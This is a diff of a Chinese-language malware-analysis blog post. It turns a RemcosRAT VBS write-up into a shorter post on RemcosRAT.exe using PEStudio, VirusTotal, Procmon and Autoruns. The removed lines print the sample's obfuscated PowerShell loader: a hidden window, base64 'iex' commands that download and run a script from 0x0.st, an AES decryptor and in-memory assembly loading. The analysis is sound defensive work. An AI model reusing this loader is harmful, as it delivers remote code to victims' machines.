@@ -21,32 +21,30 @@
     var CONFIG = {"hostname":"blog.thieves.site","root":"/","scheme":"Mist","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":false,"style":"mac"},"back2top":{"enable":true,"sidebar":true,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":true,"lazyload":true,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
   </script>
 
-  <meta name="description" content="前言 這篇文章將說明分析惡意軟體。   在本練習中，我們將對 vbs 惡意檔案進行靜態和動態分析，透過分析其樣本來了解其行為。">
+  <meta name="description" content="前言 這篇文章將說明分析惡意軟體。   在本練習中，我們將對 RemcosRAT.exe 惡意檔案進行靜態和動態分析，透過分析其樣本來了解其行為。">
 <meta property="og:type" content="article">
-<meta property="og:title" content="【惡意軟體分析】- 03">
-<meta property="og:url" content="https://blog.thieves.site/posts/32167/index.html">
+<meta property="og:title" content="【惡意軟體分析】RemcosRAT Malware - 04">
+<meta property="og:url" content="https://blog.thieves.site/posts/49126/index.html">
 <meta property="og:site_name" content="Roydon&#39;s Note">
-<meta property="og:description" content="前言 這篇文章將說明分析惡意軟體。   在本練習中，我們將對 vbs 惡意檔案進行靜態和動態分析，透過分析其樣本來了解其行為。">
+<meta property="og:description" content="前言 這篇文章將說明分析惡意軟體。   在本練習中，我們將對 RemcosRAT.exe 惡意檔案進行靜態和動態分析，透過分析其樣本來了解其行為。">
 <meta property="og:locale" content="zh_TW">
-<meta property="og:image" content="https://blog.thieves.site/posts/32167/pe-studio-1.png">
-<meta property="og:image" content="https://blog.thieves.site/posts/32167/virustotal.png">
-<meta property="og:image" content="https://blog.thieves.site/posts/32167/procmon-1.png">
-<meta property="og:image" content="https://blog.thieves.site/posts/32167/autoruns-1.png">
-<meta property="og:image" content="https://blog.thieves.site/posts/32167/vba-edit-1.png">
-<meta property="og:image" content="https://blog.thieves.site/posts/32167/vba-edit-2.png">
-<meta property="og:image" content="https://blog.thieves.site/posts/32167/hide-malware.png">
-<meta property="article:published_time" content="2025-02-14T09:43:55.000Z">
-<meta property="article:modified_time" content="2025-02-18T05:37:33.345Z">
+<meta property="og:image" content="https://blog.thieves.site/posts/49126/pe-studio-1.png">
+<meta property="og:image" content="https://blog.thieves.site/posts/49126/pe-studio-2.png">
+<meta property="og:image" content="https://blog.thieves.site/posts/49126/virustotal.png">
+<meta property="og:image" content="https://blog.thieves.site/posts/49126/process-monitor-1.png">
+<meta property="og:image" content="https://blog.thieves.site/posts/49126/autoruns-1.png">
+<meta property="og:image" content="https://blog.thieves.site/posts/49126/hide-malware.png">
+<meta property="article:published_time" content="2025-02-18T03:35:45.000Z">
+<meta property="article:modified_time" content="2025-02-18T06:35:41.242Z">
 <meta property="article:author" content="Roydon">
 <meta property="article:tag" content="analysis">
 <meta property="article:tag" content="malware">
 <meta property="article:tag" content="RemcosRAT">
-<meta property="article:tag" content="vbs">
-<meta property="article:tag" content="未完成">
+<meta property="article:tag" content="exe">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://blog.thieves.site/posts/32167/pe-studio-1.png">
+<meta name="twitter:image" content="https://blog.thieves.site/posts/49126/pe-studio-1.png">
 
-<link rel="canonical" href="https://blog.thieves.site/posts/32167/">
+<link rel="canonical" href="https://blog.thieves.site/posts/49126/">
 
 
 <script id="page-configurations">
@@ -59,7 +57,7 @@
   };
 </script>
 
-  <title>【惡意軟體分析】- 03 | Roydon's Note</title>
+  <title>【惡意軟體分析】RemcosRAT Malware - 04 | Roydon's Note</title>
   
 
 
@@ -199,7 +197,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-TW">
-    <link itemprop="mainEntityOfPage" href="https://blog.thieves.site/posts/32167/">
+    <link itemprop="mainEntityOfPage" href="https://blog.thieves.site/posts/49126/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/death.svg">
@@ -212,7 +210,7 @@
     </span>
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
-          【惡意軟體分析】- 03
+          【惡意軟體分析】RemcosRAT Malware - 04
         </h1>
 
         <div class="post-meta">
@@ -221,16 +219,10 @@
                 <i class="far fa-calendar"></i>
               </span>
               <span class="post-meta-item-text">發表於</span>
+              
 
-              <time title="創建時間：2025-02-14 17:43:55" itemprop="dateCreated datePublished" datetime="2025-02-14T17:43:55+08:00">2025-02-14</time>
+              <time title="創建時間：2025-02-18 11:35:45 / 修改時間：14:35:41" itemprop="dateCreated datePublished" datetime="2025-02-18T11:35:45+08:00">2025-02-18</time>
             </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新於</span>
-                <time title="修改時間：2025-02-18 13:37:33" itemprop="dateModified" datetime="2025-02-18T13:37:33+08:00">2025-02-18</time>
-              </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
                 <i class="far fa-folder"></i>
@@ -250,8 +242,8 @@
       </span>
       <span class="post-meta-item-text">Disqus：</span>
     
-    <a title="disqus" href="/posts/32167/#disqus_thread" itemprop="discussionUrl">
-      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="posts/32167/" itemprop="commentCount"></span>
+    <a title="disqus" href="/posts/49126/#disqus_thread" itemprop="discussionUrl">
+      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="posts/49126/" itemprop="commentCount"></span>
     </a>
   </span>
   
@@ -261,14 +253,14 @@
                 <i class="far fa-file-word"></i>
               </span>
                 <span class="post-meta-item-text">文章字數：</span>
-              <span>4.7k</span>
+              <span>567</span>
             </span>
             <span class="post-meta-item" title="所需閱讀時間">
               <span class="post-meta-item-icon">
                 <i class="far fa-clock"></i>
               </span>
                 <span class="post-meta-item-text">所需閱讀時間 &asymp;</span>
-              <span>4 分鐘</span>
+              <span>1 分鐘</span>
             </span>
 
         </div>
@@ -285,7 +277,7 @@
 <p><font size='3'>這篇文章將說明分析惡意軟體。</font></p>
 </blockquote>
 <font size='3'>
-在本練習中，我們將對 vbs 惡意檔案進行靜態和動態分析，透過分析其樣本來了解其行為。
+在本練習中，我們將對 RemcosRAT.exe 惡意檔案進行靜態和動態分析，透過分析其樣本來了解其行為。
 </font>
 
 <br>
@@ -293,25 +285,18 @@
 <hr>
 <span id="more"></span>
 
-
 <h5 id="⚙️-Lab-Environment："><a href="#⚙️-Lab-Environment：" class="headerlink" title="⚙️ Lab Environment："></a>⚙️ Lab Environment：</h5><ul>
-<li><p><font size='3'>Linux Remnux ( Static Analysis )</font></p>
-</li>
-<li><p><font size='3'>Windows 11 ( Dynamic Analysis )</font></p>
-</li>
-<li><p><a href='https://bazaar.abuse.ch/sample/01ed509842998f2309e2aa5ff2aaba7f12fec0e25c7a7a6f01d5d672c6a06363/' target='_blank'><font size='3' color='#33ccff'>RemcosRAT.vbs</font></a></p>
-</li>
-<li><p><font size='3'>HASH256：<code>01ed509842998f2309e2aa5ff2aaba7f12fec0e25c7a7a6f01d5d672c6a06363</code></font></p>
-</li>
+<li><font size='3'>Linux Remnux ( Static Analysis )</font></li>
+<li><font size='3'>Windows 11 ( Dynamic Analysis )</font></li>
+<li><font size='3'>MD5：<code>36536F8C42C258DCC23889DE6D72019E</code></font></li>
 </ul>
 <hr>
 <h3 id="🔥-Static-Analysis-🔥"><a href="#🔥-Static-Analysis-🔥" class="headerlink" title="🔥 Static Analysis 🔥"></a><font size='5' align='center'>🔥 Static Analysis 🔥</font></h3><hr>
 <br>
 
-
 <h4 id="🛠️-Static-Analysis-Tools"><a href="#🛠️-Static-Analysis-Tools" class="headerlink" title="🛠️ Static Analysis Tools"></a>🛠️ Static Analysis Tools</h4><ul>
 <li><font size='3'>PEStudio → 提取多種關鍵資訊</font></li>
-<li><font size='3'>Virustotal   → 檢查 hash</font></li>
+<li><font size='3'>Virustotal   → 查看執行檔</font></li>
 </ul>
 <br>
 
@@ -319,14 +304,12 @@
 <br>
 
 <h4 id="1️⃣-PEStudio"><a href="#1️⃣-PEStudio" class="headerlink" title="1️⃣ PEStudio"></a>1️⃣ PEStudio</h4><ul>
-<li><font size='3'>檔案的名稱、副檔名皆可以更改，所以需要檢查檔案類型。</font></li>
-<li><font size='3'>查看檔案資訊是否有可疑地方</font><ul>
-<li><font size='3'><code>CreateObject(&quot;Scripting.FileSystemObject&quot;)</code> ： 建立&#x2F;修改&#x2F;刪除檔案、寫入執行指令。</font></li>
-<li><font size='3'><code>Set kSPdG = YIEhr.CreateTextFile(YoSeb &amp; &quot;\&quot; &amp; randomVBSBatName, True)&quot;</code> ： 建立一個 bat 檔案。</font></li>
+<li><font size='3'>針對檔案資訊進行初步查找</font></li>
 </ul>
-</li>
-</ul>
-<p><img data-src='pe-studio-1.png' align='center' width='700' alt='知道該檔案確定是 PE32 格式'></img></p>
+<p><img data-src='pe-studio-1.png' width='700' align='center' alt='查看 Strings'></img></p>
+<br>
+
+<p><img data-src='pe-studio-2.png' width='700' align='center' alt='查看 HASH'></img></p>
 <br>
 
 <h4 id="2️⃣-Virustotal"><a href="#2️⃣-Virustotal" class="headerlink" title="2️⃣ Virustotal"></a>2️⃣ Virustotal</h4><ul>
@@ -335,11 +318,8 @@
 <p><img data-src='virustotal.png' width='700' align='center' alt='確定該檔案確實為惡意程式'></img></p>
 <br>
 
-<h4 id="3️⃣-Virustotal"><a href="#3️⃣-Virustotal" class="headerlink" title="3️⃣ Virustotal"></a>3️⃣ Virustotal</h4><ul>
-<li><font size='3'>將提取到的 Hash 值，提交到 <a target="_blank" rel="noopener" href="https://www.virustotal.com/gui/home/upload">Virustotal</a> 查看是否已經有紀錄。</font></li>
-</ul>
-<br>
 
+<br>
 
 <hr>
 <h3 id="🔥-Dynamic-Analysis-🔥"><a href="#🔥-Dynamic-Analysis-🔥" class="headerlink" title="🔥 Dynamic Analysis 🔥"></a><font size='5' align='center'>🔥 Dynamic Analysis 🔥</font></h3><hr>
@@ -355,17 +335,14 @@
 <br>
 
 <h4 id="1️⃣-Procmon"><a href="#1️⃣-Procmon" class="headerlink" title="1️⃣ Procmon"></a>1️⃣ Procmon</h4><ul>
-<li><font size='3'>查看有無錄製到可疑的路徑、檔案行為</font><ul>
-<li><font size='3'>找尋 <code>wscript.exe</code> ，確實看到一個在 <code>TMP</code> 下面的 <code>bat</code> 檔 ( 明顯有問題 )。</font></li>
+<li>監控程式的行為</li>
 </ul>
-</li>
-</ul>
-<p><img data-src='procmon-1.png' width='700' align='center' alt='Procmon'></img></p>
+<p><img data-src='process-monitor-1.png' width='700' align='center' alt='查看到有建立一個檔案'></img></p>
 <br>
 
 <h4 id="2️⃣-AutoRuns"><a href="#2️⃣-AutoRuns" class="headerlink" title="2️⃣ AutoRuns"></a>2️⃣ AutoRuns</h4><ul>
-<li>檢查有無可疑的路徑、檔案。<ul>
-<li>找到一個可疑檔案 ( 名稱可以、副檔名不對、路徑不對、無憑證 )。</li>
+<li>查看有無可疑的路徑、檔案<ul>
+<li>明顯添加一個可疑檔案</li>
 </ul>
 </li>
 </ul>
@@ -373,43 +350,19 @@
 <br>
 
 <hr>
-<h4 id="1️⃣-vbsEdit"><a href="#1️⃣-vbsEdit" class="headerlink" title="1️⃣ vbsEdit"></a>1️⃣ vbsEdit</h4><ul>
-<li><font size='3'>打開惡意程式</font></li>
-</ul>
-<p><img data-src='vba-edit-1.png' width='700' align='center' alt='使用 NotePad 查看代碼'></img></p>
 <br>
-
-<p><img data-src='vba-edit-2.png' width='700' align='center' alt='使用 VBAEdit 查看代碼'></img></p>
-<br>
-
-<ul>
-<li><font size='3'>整理一下代碼： </font><ul>
-<li><font size='3'>BASE64</font></li>
-<li><font size='3'>AES</font></li>
-</ul>
-</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">&quot;%FsxeI%s%FsxeI%e%FsxeI%t%FsxeI% &quot;&quot;TIZVOs=;</span><br><span class="line"></span><br><span class="line">$QfYeqOS=&#x27;Split&#x27;.Replace(&#x27;&#x27;, &#x27;&#x27;),&#x27;ReadLines&#x27;.Replace(&#x27;&#x27;, &#x27;&#x27;),&#x27;Decompress&#x27;.Replace(&#x27;&#x27;, &#x27;&#x27;),&#x27;MainModule&#x27;.Replace(&#x27;&#x27;, &#x27;&#x27;),&#x27;CreateDecryptor&#x27;.Replace(&#x27;&#x27;, &#x27;&#x27;),&#x27;CopyTo&#x27;.Replace(&#x27;&#x27;, &#x27;&#x27;),&#x27;ChangeExtension&#x27;.Replace(&#x27;&#x27;, &#x27;&#x27;),&#x27;TransformFinalBlock&#x27;.Replace(&#x27;&#x27;, &#x27;&#x27;),&#x27;ElementAt&#x27;.Replace(&#x27;&#x27;, &#x27;&#x27;),&#x27;GetCurrentProcess&#x27;.Replace(&#x27;&#x27;, &#x27;&#x27;),&#x27;Invoke&#x27;.Replace(&#x27;&#x27;, &#x27;&#x27;),&#x27;EntryPoint&#x27;.Replace(&#x27;&#x27;, &#x27;&#x27;);</span><br><span class="line"></span><br><span class="line">powershell -w hidden;</span><br><span class="line"></span><br><span class="line">iex (($([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String(&#x27;U1RSSU5HUkFORE9NaVNUUklOR1JBTkRPTWVTVFJJTkdSQU5ET014ICgoaVNUUklOR1JkRPTXdTVFJJTkdSQU5ET01yU1RSSU5HUkFORE9NIC1TVFJJTkdSQU5ET01VU1RSSU5HUkFORE9Nc1NUUklOR1JkRPTWVTVFJJTkdSQU5ET01CU1RSSU5HUkFORE9NYVNUUklOR1JkRPTXNTVFJJTkdSQU5ET01pU1RSSU5HUkFORE9NY1NUUklOR1JkRPTVVFJJTkdSQU5ET01hU1RSSU5HUkFORE9NclNUUklOR1JkRPTXNTVFJJTkdSQU5ET01pU1RSSU5HUkFORE9NblNUUklOR1JkRPTWdTVFJJTkdSQU5ET00gIlNUUklOR1JkRPTWhTVFJJTkdSQU5ET010dHBzU1RSSU5HUkFORE9NOlNUUklOR1JBTkRPTS9TVFJJTkdSQU5ET00vU1RSSU5HUkFORE9NMFNUUklOR1JBTkRPTXhTVFJJTkdSQU5ET00wU1RSSU5HUkFORE9NLlNUUklOR1JkRPTXNTVFJJTkdSQU5ET010U1RSSU5HUkFORE9NL1NUUklOR1JkRPTThTVFJJTkdSQU5ET01aU1RSSU5HUkFORE9NRFNUUklOR1JkRPTWFTVFJJTkdSQU5ET00uU1RSSU5HUkFORE9NdFNUUklOR1JBTkRPTXhTVFJJTkdSQU5ET010U1RSSU5HUkFORE9NIikuQ29udGVudC5SZXBsYWNlKCdBQkMnLCcnKSkgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWU7&#x27;)))) -replace &#x27;STRINGRANDOM&#x27;, &#x27;&#x27;);</span><br><span class="line"></span><br><span class="line">iex (($([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String(&#x27;aWV4ICgoaXdyIC1Vc2VCYXNpY1BhcnNpbmcgImh0dHBzOi8vMHgwLnN0LzhaZXkucHMxIikuQ29udGVudC5SZXBsYWNlKCdBQkMnLCcnKSkgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWU7&#x27;)))) -replace &#x27;STRINGRANDOM&#x27;, &#x27;&#x27;);</span><br><span class="line"></span><br><span class="line">## 解碼過後</span><br><span class="line"></span><br><span class="line">iex (</span><br><span class="line">  (iwr -UseBasicParsing &quot;https://0x0.st/xxxx.ps1&quot;).Content.Replace(&#x27;ABC&#x27;,&#x27;&#x27;)</span><br><span class="line">) -ErrorAction SilentlyContinue</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">function decrypt_function($param_var)&#123;$aes_var=[System.Security.Cryptography.Aes]::Create();</span><br><span class="line"></span><br><span class="line">$aes_var.Mode=[System.Security.Cryptography.CipherMode]::CBC;</span><br><span class="line"></span><br><span class="line">$aes_var.Padding=[System.Security.Cryptography.PaddingMode]::PKCS7;</span><br><span class="line"></span><br><span class="line">$aes_var.Key=[System.Convert]::FromBase64String(&#x27;ewMoxjcpzeNBZW19N7eS0/ZStjAsKH1ZQlG6Hp4+rlE=&#x27;);</span><br><span class="line"></span><br><span class="line">$aes_var.IV=[System.Convert]::FromBase64String(&#x27;GwaE+1wDAP4SIjKqb1sLhw==&#x27;);</span><br><span class="line"></span><br><span class="line">$FAPRA=$aes_var.($QfYeqOS[4])();</span><br><span class="line"></span><br><span class="line">$cJMDe=$FAPRA.($QfYeqOS[7])($param_var,0,$param_var.Length);</span><br><span class="line"></span><br><span class="line">$FAPRA.Dispose();</span><br><span class="line"></span><br><span class="line">$aes_var.Dispose();</span><br><span class="line"></span><br><span class="line">$cJMDe;</span><br><span class="line"></span><br><span class="line">&#125;function decompress_function($param_var)&#123;$OMBpZ=New-Object System.IO.MemoryStream(,$param_var);</span><br><span class="line"></span><br><span class="line">$ZMdDq=New-Object System.IO.MemoryStream;</span><br><span class="line"></span><br><span class="line">$ztAGx=New-Object System.IO.Compression.GZipStream($OMBpZ,[IO.Compression.CompressionMode]::($QfYeqOS[2]));</span><br><span class="line"></span><br><span class="line">$ztAGx.($QfYeqOS[5])($ZMdDq);</span><br><span class="line"></span><br><span class="line">$ztAGx.Dispose();</span><br><span class="line"></span><br><span class="line">$OMBpZ.Dispose();</span><br><span class="line"></span><br><span class="line">$ZMdDq.Dispose();</span><br><span class="line"></span><br><span class="line">$ZMdDq.ToArray();</span><br><span class="line"></span><br><span class="line">&#125;$YZNls=[System.IO.File]::($QfYeqOS[1])([Console]::Title);</span><br><span class="line"></span><br><span class="line">$eOuee=decompress_function (decrypt_function ([Convert]::FromBase64String([System.Linq.Enumerable]::($QfYeqOS[8])($YZNls, 6).Substring(2))));</span><br><span class="line"></span><br><span class="line">[System.Reflection.Assembly]::Load([byte[]]$eOuee).($QfYeqOS[11]).($QfYeqOS[10])($null,$null);</span><br><span class="line"></span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">kSPdG.writeline &quot;%egViW%s%egViW%e%egViW%t%egViW% &quot;&quot;JMEsIb=$host.UI.RawUI.WindowTitle=&quot;&quot;&quot;</span><br></pre></td></tr></table></figure>
-<hr>
-<br>
-
 
 <h4 id="💡-結論"><a href="#💡-結論" class="headerlink" title="💡 結論"></a>💡 結論</h4><ul>
-<li><p><font size='3'>該程式會偽裝成無害的檔案誘使受害者點擊。</font></p>
-</li>
-<li><p><font size='3'>移除 <code>C:\Users\ADMINI~1\AppData\Local\Temp\1\IXeqOHqsNh.bat</code></font></p>
-</li>
-<li><p><font size='3'>移除 <code>C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start   Menu\Programs\Startup\StartupScript_7fff24c6.cmd </code></font></p>
-</li>
+<li><font size='3'>建立 Windows NT 自動執行 ( <code>ime.exe</code> )。</font></li>
+<li><font size='3'>移除 <code>ime.exe</code> 、 <code>ime.srg</code> 。</font></li>
 </ul>
 <br>
-
 
 <hr>
 <br>
 
 <h4 id="❓-遭遇的問題"><a href="#❓-遭遇的問題" class="headerlink" title="❓ 遭遇的問題"></a>❓ 遭遇的問題</h4><ul>
-<li><font size='3'>暫無</font></li>
+<li><font size='3'>查找 <code>SzKneWgZlzw.exe</code> 的時候沒有看見檔案 </font></li>
 </ul>
 <!-- <img data-src='hide-malware.png' width='700' align='center' alt='關閉 Hide Protected operating system files'></img> -->
 
@@ -432,8 +385,7 @@
               <a href="/tags/analysis/" rel="tag"># analysis</a>
               <a href="/tags/malware/" rel="tag"># malware</a>
               <a href="/tags/RemcosRAT/" rel="tag"># RemcosRAT</a>
-              <a href="/tags/vbs/" rel="tag"># vbs</a>
-              <a href="/tags/%E6%9C%AA%E5%AE%8C%E6%88%90/" rel="tag"># 未完成</a>
+              <a href="/tags/exe/" rel="tag"># exe</a>
           </div>
 
         
@@ -442,13 +394,10 @@
         
     <div class="post-nav">
       <div class="post-nav-item">
-    <a href="/posts/17031/" rel="prev" title="【惡意軟體分析】RemcosRAT Malware - 02">
-      <i class="fa fa-chevron-left"></i> 【惡意軟體分析】RemcosRAT Malware - 02
+    <a href="/posts/32167/" rel="prev" title="【惡意軟體分析】- 03">
+      <i class="fa fa-chevron-left"></i> 【惡意軟體分析】- 03
     </a></div>
-      <div class="post-nav-item">
-    <a href="/posts/49126/" rel="next" title="【惡意軟體分析】RemcosRAT Malware - 04">
-      【惡意軟體分析】RemcosRAT Malware - 04 <i class="fa fa-chevron-right"></i>
-    </a></div>
+      <div class="post-nav-item"></div>
     </div>
       </footer>
     
@@ -514,7 +463,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E2%9A%99%EF%B8%8F-Lab-Environment%EF%BC%9A"><span class="nav-number">1.1.</span> <span class="nav-text">⚙️ Lab Environment：</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%F0%9F%94%A5-Static-Analysis-%F0%9F%94%A5"><span class="nav-number"></span> <span class="nav-text">🔥 Static Analysis 🔥</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%F0%9F%9B%A0%EF%B8%8F-Static-Analysis-Tools"><span class="nav-number">1.</span> <span class="nav-text">🛠️ Static Analysis Tools</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#1%EF%B8%8F%E2%83%A3-PEStudio"><span class="nav-number">2.</span> <span class="nav-text">1️⃣ PEStudio</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2%EF%B8%8F%E2%83%A3-Virustotal"><span class="nav-number">3.</span> <span class="nav-text">2️⃣ Virustotal</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3%EF%B8%8F%E2%83%A3-Virustotal"><span class="nav-number">4.</span> <span class="nav-text">3️⃣ Virustotal</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%F0%9F%94%A5-Dynamic-Analysis-%F0%9F%94%A5"><span class="nav-number"></span> <span class="nav-text">🔥 Dynamic Analysis 🔥</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%F0%9F%9B%A0%EF%B8%8F-Dynamic-Analysis-Tools"><span class="nav-number">1.</span> <span class="nav-text">🛠️ Dynamic Analysis Tools</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#1%EF%B8%8F%E2%83%A3-Procmon"><span class="nav-number">2.</span> <span class="nav-text">1️⃣ Procmon</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2%EF%B8%8F%E2%83%A3-AutoRuns"><span class="nav-number">3.</span> <span class="nav-text">2️⃣ AutoRuns</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#1%EF%B8%8F%E2%83%A3-vbsEdit"><span class="nav-number">4.</span> <span class="nav-text">1️⃣ vbsEdit</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%F0%9F%92%A1-%E7%B5%90%E8%AB%96"><span class="nav-number">5.</span> <span class="nav-text">💡 結論</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E2%9D%93-%E9%81%AD%E9%81%87%E7%9A%84%E5%95%8F%E9%A1%8C"><span class="nav-number">6.</span> <span class="nav-text">❓ 遭遇的問題</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%F0%9F%94%97-%E5%8F%83%E8%80%83%E4%BE%86%E6%BA%90"><span class="nav-number">7.</span> <span class="nav-text">🔗 參考來源</span></a></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E2%9A%99%EF%B8%8F-Lab-Environment%EF%BC%9A"><span class="nav-number">1.1.</span> <span class="nav-text">⚙️ Lab Environment：</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%F0%9F%94%A5-Static-Analysis-%F0%9F%94%A5"><span class="nav-number"></span> <span class="nav-text">🔥 Static Analysis 🔥</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%F0%9F%9B%A0%EF%B8%8F-Static-Analysis-Tools"><span class="nav-number">1.</span> <span class="nav-text">🛠️ Static Analysis Tools</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#1%EF%B8%8F%E2%83%A3-PEStudio"><span class="nav-number">2.</span> <span class="nav-text">1️⃣ PEStudio</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2%EF%B8%8F%E2%83%A3-Virustotal"><span class="nav-number">3.</span> <span class="nav-text">2️⃣ Virustotal</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%F0%9F%94%A5-Dynamic-Analysis-%F0%9F%94%A5"><span class="nav-number"></span> <span class="nav-text">🔥 Dynamic Analysis 🔥</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%F0%9F%9B%A0%EF%B8%8F-Dynamic-Analysis-Tools"><span class="nav-number">1.</span> <span class="nav-text">🛠️ Dynamic Analysis Tools</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#1%EF%B8%8F%E2%83%A3-Procmon"><span class="nav-number">2.</span> <span class="nav-text">1️⃣ Procmon</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2%EF%B8%8F%E2%83%A3-AutoRuns"><span class="nav-number">3.</span> <span class="nav-text">2️⃣ AutoRuns</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%F0%9F%92%A1-%E7%B5%90%E8%AB%96"><span class="nav-number">4.</span> <span class="nav-text">💡 結論</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E2%9D%93-%E9%81%AD%E9%81%87%E7%9A%84%E5%95%8F%E9%A1%8C"><span class="nav-number">5.</span> <span class="nav-text">❓ 遭遇的問題</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%F0%9F%94%97-%E5%8F%83%E8%80%83%E4%BE%86%E6%BA%90"><span class="nav-number">6.</span> <span class="nav-text">🔗 參考來源</span></a></li></ol></div>
       </div>
       <!--/noindex-->
 
@@ -707,9 +656,9 @@ if (document.querySelectorAll('pre.mermaid').length) {
 </script>
 <script>
   var disqus_config = function() {
-    this.page.url = "https://blog.thieves.site/posts/32167/";
-    this.page.identifier = "posts/32167/";
-    this.page.title = "【惡意軟體分析】- 03";
+    this.page.url = "https://blog.thieves.site/posts/49126/";
+    this.page.identifier = "posts/49126/";
+    this.page.title = "【惡意軟體分析】RemcosRAT Malware - 04";
     };
   NexT.utils.loadComments(document.querySelector('#disqus_thread'), () => {
     if (window.DISQUS) {
